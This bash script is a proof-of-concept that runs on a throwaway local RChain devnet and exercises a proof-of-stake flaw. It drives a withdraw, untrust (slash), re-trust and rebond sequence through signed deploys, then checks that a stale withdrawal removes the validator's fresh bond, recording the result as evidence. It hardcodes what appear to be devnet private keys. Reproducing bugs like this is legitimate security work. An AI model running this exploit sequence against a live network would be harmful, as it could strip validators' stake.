#!/usr/bin/env bash
# Exercise a stale PoS withdrawal through signed deploys on an actual throwaway RNode devnet.
set -euo pipefail

implementation="$(realpath "${1:?path to rchain-rust checkout}")"
evidence="$(realpath -m "${2:?evidence directory}")"
mkdir -p "$evidence"
cd "$implementation"

target_pub=04dbe32c2062240a4ba0bcad01d7edd98c78b51c77765d5e1e5e9fa3743d2f12a1f82f42cd7dc4f41445979117d790f23e9b3d08d0aa06d527c236172043e747fc
target_priv=b8a48b02757c0cfc9325498a93c3b28582e3967072f8fab0cdc8bd04d0d401ee
admin_priv=a68a6e6cca30f81bd24a719f3145d20e8424bd7b396309b0708a16c7d8000b76

# Adapt only this throwaway local launcher: set an observable short epoch, keep the
# bootstrap validator safely above 2/3 stake, and make mktemp genesis readable by rnode.
python3 - <<'PY'
from pathlib import Path
p = Path('tools/devnet.sh')
s = p.read_text()
old = '    echo "${VALIDATOR_PUB[$i]} 100" >> "$dir/bonds.txt"\n'
new = '''    if (( i == 0 )); then
      echo "${VALIDATOR_PUB[$i]} 1000" >> "$dir/bonds.txt"
    else
      echo "${VALIDATOR_PUB[$i]} 1" >> "$dir/bonds.txt"
    fi
'''
assert s.count(old) == 1
s = s.replace(old, new)
old = '    --api-port-http 40403 --api-port-admin-http 40405"\n'
new = '    --api-port-http 40403 --api-port-admin-http 40405 --epoch-length 10 --quarantine-length 20"\n'
assert s.count(old) == 1
s = s.replace(old, new)
old = '  genesis_files "$genesis_dir" "$n"\n'
assert s.count(old) == 1
s = s.replace(old, old + '  chmod 755 "$genesis_dir"\n  chmod 644 "$genesis_dir"/bonds.txt "$genesis_dir"/wallets.txt\n')
p.write_text(s)
PY

cleanup() {
  docker logs devnet-bootstrap > "$evidence/node.stdout" 2> "$evidence/node.stderr" || true
  tools/devnet.sh down -v >/dev/null 2>&1 || true
  rm -f examples/aria-attack.rho
}
trap cleanup EXIT

write_term() {
  local body="$1"
  cat > examples/aria-attack.rho <<RHO
new return, pos(\`rho:rchain:pos\`), revAddress(\`rho:rchain:revAddress\`), deployerId(\`rho:rchain:deployerId\`), ret in {
  $body
}
RHO
}

submit() {
  local label="$1" key="$2" body="$3" height deploy_id seen=false
  write_term "$body"
  height="$(curl -fsS http://localhost:40403/api/v1/status | sed -n 's/.*"latestBlockNumber":[[:space:]]*\([0-9][0-9]*\).*/\1/p')"
  [[ "$height" =~ ^[0-9]+$ ]] || { echo "could not read block height" >&2; return 1; }
  docker exec devnet-bootstrap rnode --grpc-host localhost deploy \
    --phlo-limit 1000000 --phlo-price 1 --private-key "$key" --shard-id /root \
    --valid-after-block-number "$height" "/contracts/aria-attack.rho" > "$evidence/$label-deploy.log" 2>&1
  deploy_id="$(sed -n 's/.*DeployId is: \([0-9a-f]*\).*/\1/p' "$evidence/$label-deploy.log")"
  [[ "$deploy_id" =~ ^[0-9a-f]{32,}$ ]] || { cat "$evidence/$label-deploy.log"; return 1; }
  for _ in $(seq 1 60); do
    curl -fsS "http://localhost:40403/api/v1/deploy-status/$deploy_id" > "$evidence/$label-status.json" || true
    if grep -q 'ProcessedWithSuccess' "$evidence/$label-status.json"; then seen=true; break; fi
    sleep 1
  done
  [[ "$seen" == true ]] || { cat "$evidence/$label-status.json"; return 1; }
  timeout 120 docker exec devnet-bootstrap rnode --grpc-host localhost listen-data-at-name -t pub -c "\"aria-$label\"" > "$evidence/$label-reply.txt" 2>&1
  printf '%s|deploy=%s|block-after=%s\n' "$label" "$deploy_id" "$(curl -fsS http://localhost:40403/api/v1/status | sed -n 's/.*"latestBlockNumber":[[:space:]]*\([0-9][0-9]*\).*/\1/p')" >> "$evidence/observations.txt"
}

advance_without_reply() {
  local count="$1" i height deploy_id
  for (( i = 0; i < count; i++ )); do
    height="$(curl -fsS http://localhost:40403/api/v1/status | sed -n 's/.*"latestBlockNumber":[[:space:]]*\([0-9][0-9]*\).*/\1/p')"
    docker exec devnet-bootstrap rnode --grpc-host localhost deploy \
      --phlo-limit 1000000 --phlo-price 1 --private-key "$admin_priv" --shard-id /root \
      --valid-after-block-number "$height" /contracts/aria-attack.rho > "$evidence/advance-$i.log" 2>&1
    deploy_id="$(sed -n 's/.*DeployId is: \([0-9a-f]*\).*/\1/p' "$evidence/advance-$i.log")"
    [[ "$deploy_id" =~ ^[0-9a-f]{32,}$ ]]
    for _ in $(seq 1 60); do
      curl -fsS "http://localhost:40403/api/v1/deploy-status/$deploy_id" > "$evidence/advance-$i-status.json" || true
      grep -q 'ProcessedWithSuccess' "$evidence/advance-$i-status.json" && break
      sleep 1
    done
    grep -q 'ProcessedWithSuccess' "$evidence/advance-$i-status.json"
  done
}

# Every no-op deploy advances a real block when included; used to cross the epoch boundary.
cat > examples/aria-attack.rho <<'RHO'
Nil
RHO

tools/devnet.sh build > "$evidence/docker-build.log" 2>&1
tools/devnet.sh up --validators 2 --no-autopropose > "$evidence/devnet-up.log" 2>&1
curl -fsS --retry 10 --retry-delay 2 http://localhost:40403/api/v1/status > "$evidence/status-start.json"
ready=false
for _ in $(seq 1 120); do
  if tools/devnet.sh propose > "$evidence/genesis-ready.log" 2>&1; then ready=true; break; fi
  sleep 2
done
[[ "$ready" == true ]] || { cat "$evidence/genesis-ready.log"; exit 1; }

# Ask the real node to derive validator 1's REV address, then fund that key through devnet faucet.
submit address "$admin_priv" "revAddress!(\"fromPublicKey\", \"$target_pub\".hexToBytes(), *ret) | for (@addr <- ret) { @\"aria-address\"!(addr) }"
target_addr="$(sed -n 's/.*\(111[1-9A-HJ-NP-Za-km-z]\{20,\}\).*/\1/p' "$evidence/address-reply.txt" | head -1)"
[[ -n "$target_addr" ]] || { cat "$evidence/address-reply.txt"; exit 1; }
tools/devnet.sh faucet "$target_addr" > "$evidence/faucet.json"

# The actual sequence: withdraw, slash via untrust, restore trust, then bond fresh stake.
submit withdraw "$target_priv" 'pos!("withdraw", *deployerId, *ret) | for (@r <- ret) { @"aria-withdraw"!(r) }'
grep -qi true "$evidence/withdraw-reply.txt"
submit untrust "$admin_priv" "pos!(\"untrust\", *deployerId, \"$target_pub\".hexToBytes(), *ret) | for (@r <- ret) { @\"aria-untrust\"!(r) }"
grep -qi true "$evidence/untrust-reply.txt"
submit retrust "$admin_priv" "pos!(\"trust\", *deployerId, \"$target_pub\".hexToBytes(), *ret) | for (@r <- ret) { @\"aria-retrust\"!(r) }"
grep -qi true "$evidence/retrust-reply.txt"
submit rebond "$target_priv" 'pos!("bond", *deployerId, 50, *ret) | for (@r <- ret) { @"aria-rebond"!(r) }'
grep -qi true "$evidence/rebond-reply.txt"

# Confirm fresh stake is present before the boundary, then advance actual blocks to height 10.
submit pool-before-boundary "$admin_priv" "pos!(\"getBonds\", *ret) | for (@b <- ret) { @\"aria-pool-before\"!(b) }"
grep -qi "$target_pub" "$evidence/pool-before-boundary-reply.txt"
cat > examples/aria-attack.rho <<'RHO'
Nil
RHO
height="$(curl -fsS http://localhost:40403/api/v1/status | sed -n 's/.*"latestBlockNumber":[[:space:]]*\([0-9][0-9]*\).*/\1/p')"
advance_without_reply "$((10 - height))"

# A fresh withdrawal claim at block 10 proves the old pending request survived slash and
# consumed the replacement bond. If slash had cleared pending state, this validator remains bonded.
submit pool-at-boundary "$admin_priv" "pos!(\"getBonds\", *ret) | for (@b <- ret) { @\"aria-pool-at-boundary\"!(b) }"
if grep -qi "$target_pub" "$evidence/pool-at-boundary-reply.txt"; then
  cat "$evidence/pool-at-boundary-reply.txt"
  echo 'FAIL: target remained bonded; stale withdrawal did not consume replacement bond' >&2
  exit 1
fi
printf 'ARIA_STALE_WITHDRAW_REAL_NODE_V1|withdraw=true|untrust_slash=true|retrust=true|rebond=50|fresh_bond_removed_at_epoch_boundary=true\n' | tee "$evidence/observation.txt"
